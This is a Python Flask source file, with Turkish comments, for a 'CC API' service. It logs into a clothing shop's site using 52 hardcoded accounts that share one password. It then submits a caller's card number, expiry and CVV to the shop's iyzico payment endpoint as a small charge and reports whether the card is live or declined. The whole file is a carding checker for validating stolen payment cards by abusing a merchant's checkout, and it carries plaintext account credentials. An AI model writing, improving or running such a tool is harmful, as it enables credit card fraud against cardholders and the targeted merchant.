from flask import Flask, request, jsonify
import requests
from bs4 import BeautifulSoup
import re
import json

app = Flask(__name__)

# GERÇEK TEST KARTLARI
TEST_CARDS = {
    "visa": [
        {"number": "4155650100416111", "cvv": "123", "holder": "John Doe"},
        {"number": "4546711234567894", "cvv": "123", "holder": "John Doe"},
        {"number": "4111111111111111", "cvv": "123", "holder": "John Doe"}
    ],
    "mastercard": [
        {"number": "5406671000000005", "cvv": "123", "holder": "John Doe"},
        {"number": "5431111111111111", "cvv": "123", "holder": "John Doe"},
        {"number": "5504720000000006", "cvv": "123", "holder": "John Doe"}
    ]
}

# YENİ HESAPLAR - 6 haneli kodlarla
ACCOUNTS = {
    "111111": {"email": "wkwk2kw92@gmail.com", "password": "babapro31"},
    "111112": {"email": "1akqoqisisi@gmail.com", "password": "babapro31"},
    "111113": {"email": "akqiwiwiwiw@gmail.com", "password": "babapro31"},
    "111114": {"email": "qoqow928wz@gmail.com", "password": "babapro31"},
    "111115": {"email": "heleleleleposta@gmail.com", "password": "babapro31"},
    "111116": {"email": "kenevizhelelelele@gmail.com", "password": "babapro31"},
    "111117": {"email": "ananahelelelelel@gmail.com", "password": "babapro31"},
    "111118": {"email": "oylesine@gmail.com", "password": "babapro31"},
    "111119": {"email": "yaparim@gmail.com", "password": "babapro31"},
    "111120": {"email": "yaparimm@gmail.com", "password": "babapro31"},
    "111121": {"email": "ekwkwkdkks@gmail.com", "password": "babapro31"},
    "111122": {"email": "siktirgit@gmail.com", "password": "babapro31"},
    "111123": {"email": "abouu@gmail.com", "password": "babapro31"},
    "111124": {"email": "gafarat@gmail.com", "password": "babapro31"},
    "111125": {"email": "bomba@gmail.com", "password": "babapro31"},
    "111126": {"email": "yasiktir@gmail.com", "password": "babapro31"},
    "111127": {"email": "babaninamk@gmail.com", "password": "babapro31"},
    "111128": {"email": "oajqkwksk@gmail.com", "password": "babapro31"},
    "111129": {"email": "yavkesawk@gmail.com", "password": "babapro31"},
    "111130": {"email": "ananinawk@gmail.com", "password": "babapro31"},
    "111131": {"email": "siktirgitt@gmail.com", "password": "babapro31"},
    "111132": {"email": "ajajskakak@gmail.com", "password": "babapro31"},
    "111133": {"email": "qowkskqk@gmail.com", "password": "babapro31"},
    "111134": {"email": "owowkwksksk@gmail.com", "password": "babapro31"},
    "111135": {"email": "qoqoaoa@gmail.com", "password": "babapro31"},
    "111136": {"email": "pqiqiqkq@gmail.com", "password": "babapro31"},
    "111137": {"email": "mckskaaks@gmail.com", "password": "babapro31"},
    "111138": {"email": "pqoaoaoa@gmail.com", "password": "babapro31"},
    "111139": {"email": "akakakaksksk@gmail.com", "password": "babapro31"},
    "111140": {"email": "qoaoakza@gmail.com", "password": "babapro31"},
    "111141": {"email": "osiwjsm@gmail.com", "password": "babapro31"},
    "111142": {"email": "lskamamznz@gmail.com", "password": "babapro31"},
    "111143": {"email": "qowiwuwuw@gmail.com", "password": "babapro31"},
    "111144": {"email": "2iwjwiwjajwja2@gmail.com", "password": "babapro31"},
    "111145": {"email": "po7hhkign@gmail.com", "password": "babapro31"},
    "111146": {"email": "ojhfiohgt@gmail.com", "password": "babapro31"},
    "111147": {"email": "yreschjjj@gmail.com", "password": "babapro31"},
    "111148": {"email": "sjeksjdj@gmail.com", "password": "babapro31"},
    "111149": {"email": "msmsmsjsjsj@gmail.com", "password": "babapro31"},
    "111150": {"email": "ajqjqiausjaka@gmail.com", "password": "babapro31"},
    "111151": {"email": "qiwjsjsjaka@gmail.com", "password": "babapro31"},
    "111152": {"email": "qoqoaija@gmail.com", "password": "babapro31"},
    "111153": {"email": "mdjsnsakka@gmail.com", "password": "babapro31"},
    "111154": {"email": "wiwi2k39diz@gamil.com", "password": "babapro31"},
    "111155": {"email": "ei1iw8disk@gmail.com", "password": "babapro31"},
    "111156": {"email": "eowowk2k28@gmail.com", "password": "babapro31"},
    "111157": {"email": "qiqisk1929w@gmail.com", "password": "babapro31"},
    "111158": {"email": "2isisiqoskzns@gmail.com", "password": "babapro31"},
    "111159": {"email": "eowieis9q9@gmail.com", "password": "babapro31"},
    "111160": {"email": "iwwkk1kww3@gmail.com", "password": "babapro31"},
    "111161": {"email": "qlqoq9q01@gmail.com", "password": "babapro31"},
    "111162": {"email": "w9w91isjsqkskns@gmail.com", "password": "babapro31"}
}

session = requests.Session()
requests.packages.urllib3.disable_warnings()

def format_json_response(data):
    """JSON çıktısını okunabilir formatta döndür"""
    return json.dumps(data, ensure_ascii=False, indent=4)

def login_to_site(email, password):
    """Siteye login ol"""
    try:
        login_get_url = "https://cmrerkekgiyim.com/uyegirisi"
        headers_get = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*"
        }

        res_get = session.get(login_get_url, headers=headers_get, verify=False)
        php_sess = session.cookies.get("PHPSESSID", "")

        login_post_url = "https://cmrerkekgiyim.com/uyeislem.php?islem=girisyap"
        login_headers = {
            "User-Agent": headers_get["User-Agent"],
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://cmrerkekgiyim.com",
            "Referer": login_get_url,
            "Cookie": f"PHPSESSID={php_sess}"
        }

        login_data = {"eposta": email, "sifre": password}
        res_post = session.post(login_post_url, headers=login_headers, data=login_data, verify=False)

        return "Giriş Başarılı" in res_post.text

    except Exception as e:
        print(f"Login hatası: {e}")
        return False

def get_user_profile():
    """Kullanıcı profil bilgilerini al"""
    try:
        profil_url = "https://cmrerkekgiyim.com/profilim"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

        res_profil = session.get(profil_url, headers=headers, verify=False)
        soup = BeautifulSoup(res_profil.text, "html.parser")

        isim_input = soup.find("input", {"id": "profile-first-name"})
        isim = isim_input.get("value", "") if isim_input else "John Doe"

        return isim
    except Exception as e:
        print(f"Profil alma hatası: {e}")
        return "John Doe"

# ANA SAYFA
@app.route("/")
def home():
    """Ana sayfa - API çalışıyor mesajı"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>CC API Servisi</title>
        <style>
            body { 
                font-family: Arial, sans-serif; 
                max-width: 800px; 
                margin: 50px auto; 
                padding: 20px;
                background-color: #f5f5f5;
            }
            .container {
                background: white;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            h1 { color: #2c3e50; }
            .status { 
                color: #27ae60; 
                font-weight: bold;
                font-size: 1.2em;
            }
            .endpoint {
                background: #f8f9fa;
                padding: 15px;
                margin: 10px 0;
                border-left: 4px solid #3498db;
                border-radius: 5px;
            }
            code {
                background: #2c3e50;
                color: white;
                padding: 2px 6px;
                border-radius: 3px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚀 CC API Servisi</h1>
            <p class="status">✅ API aktif ve çalışıyor!</p>
            
            <div class="endpoint">
                <h3>📋 Kullanım:</h3>
                <code>/hesap4/hesapcode/iyzico?cc=KART_NUMARASI&ay=AA&yil=YYYY&cvv=CVV</code>
            </div>
            
            <div class="endpoint">
                <h3>🔑 Mevcut Hesap Kodları (İlk 10):</h3>
                <ul>
                    <li><strong>111111</strong> - wkwk2kw92@gmail.com</li>
                    <li><strong>111112</strong> - 1akqoqisisi@gmail.com</li>
                    <li><strong>111113</strong> - akqiwiwiwiw@gmail.com</li>
                    <li><strong>111114</strong> - qoqow928wz@gmail.com</li>
                    <li><strong>111115</strong> - heleleleleposta@gmail.com</li>
                    <li><strong>111116</strong> - kenevizhelelelele@gmail.com</li>
                    <li><strong>111117</strong> - ananahelelelelel@gmail.com</li>
                    <li><strong>111118</strong> - oylesine@gmail.com</li>
                    <li><strong>111119</strong> - yaparim@gmail.com</li>
                    <li><strong>111120</strong> - yaparimm@gmail.com</li>
                    <li>... ve daha fazlası (toplam 52 hesap)</li>
                </ul>
            </div>
            
            <div class="endpoint">
                <h3>🎯 Örnek Kullanım:</h3>
                <code>/hesap4/111111/iyzico?cc=4155650100416111&ay=12&yil=2026&cvv=123</code>
            </div>
        </div>
    </body>
    </html>
    """

# ANA ENDPOINT
@app.route("/hesap4/<hesapcode>/iyzico")
def iyzico_with_account(hesapcode):
    try:
        # Hesap kontrolü
        if hesapcode not in ACCOUNTS:
            response_data = {
                "status": "error",
                "message": "❌ Geçersiz hesap kodu",
                "available_codes": list(ACCOUNTS.keys())[:10]  # İlk 10 kodu göster
            }
            return format_json_response(response_data), 400

        account = ACCOUNTS[hesapcode]
        
        # Parametreleri al
        cc = request.args.get("cc", "").strip()
        ay = request.args.get("ay", "").strip()
        yil = request.args.get("yil", "").strip()
        cvv = request.args.get("cvv", "").strip()
        identity = request.args.get("identityNumber", "").strip()

        # Gerekli parametre kontrolü
        if not all([cc, ay, yil, cvv]):
            response_data = {
                "status": "error",
                "message": "Eksik parametre: cc, ay, yil, cvv gerekli",
                "account": account["email"]
            }
            return format_json_response(response_data), 400

        # Siteye login ol
        if not login_to_site(account["email"], account["password"]):
            response_data = {
                "status": "error",
                "message": "Siteye giriş başarısız",
                "account": account["email"]
            }
            return format_json_response(response_data), 403

        # Kullanıcı bilgilerini al
        isim = get_user_profile()

        # İyzico isteği
        iyzico_url = "https://cmrerkekgiyim.com/iyzicoparapuan.php"
        iyzico_data = {
            "toplamtutar": "5",
            "aciklama": "Test ödemesi",
            "CardHolderName": isim,
            "CardNumber": cc,
            "Expire": f"{ay}/{yil}",
            "x_card_code": cvv,
            "identityNumber": identity or "11111111111",
            "taksit": "1"
        }

        iyz_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://cmrerkekgiyim.com",
            "Referer": "https://cmrerkekgiyim.com/profilim"
        }

        iyz_res = session.post(iyzico_url, headers=iyz_headers, data=iyzico_data, verify=False)

        # Response analizi
        response_text = iyz_res.text.lower()

        # Başarılı durumlar
        success_indicators = [
            "3-d secure", "ödeme başarılı", "işlem başarılı",
            "redirecting", "bank page", "secure3d"
        ]

        if any(indicator in response_text for indicator in success_indicators):
            response_data = {
                "status": "success",
                "message": "✅ Kart geçerli - 3D Secure yönlendirmesi bekleniyor",
                "card": f"{cc[:6]}******{cc[-4:]}",
                "brand": "VISA" if cc.startswith('4') else "MASTERCARD",
                "account": account["email"]
            }
            return format_json_response(response_data)

        # Hata durumları
        error_patterns = {
            "geçersiz kart": "Geçersiz kart numarası",
            "invalid card": "Geçersiz kart",
            "süresi dolmuş": "Kart süresi dolmuş",
            "expired": "Kart süresi dolmuş",
            "güvenlik kodu": "Geçersiz CVV",
            "cvv": "Geçersiz CVV",
            "güvenlik denetim": "Güvenlik denetimi başarısız"
        }

        for pattern, message in error_patterns.items():
            if pattern in response_text:
                response_data = {
                    "status": "declined",
                    "message": f"❌ {message}",
                    "card": cc,
                    "details": "Bankadan red yanıtı alındı",
                    "account": account["email"]
                }
                return format_json_response(response_data)

        # HTML hata mesajı ara
        soup = BeautifulSoup(iyz_res.text, "html.parser")
        error_div = soup.find("div", {"class": "alert alert-danger"})

        if error_div:
            error_text = error_div.get_text(strip=True)
            response_data = {
                "status": "declined",
                "message": "❌ İşlem reddedildi",
                "card": cc,
                "details": error_text,
                "account": account["email"]
            }
            return format_json_response(response_data)
        else:
            # Belirsiz durum
            response_data = {
                "status": "unknown",
                "message": "⚠️ İşlem durumu belirsiz",
                "card": cc,
                "details": "Bankadan net yanıt alınamadı",
                "response_sample": response_text[:200] + "...",
                "account": account["email"]
            }
            return format_json_response(response_data)

    except Exception as e:
        response_data = {
            "status": "error",
            "message": f"🔥 Sistem hatası: {str(e)}",
            "card": cc if 'cc' in locals() else "Unknown",
            "account": account["email"]
        }
        return format_json_response(response_data), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
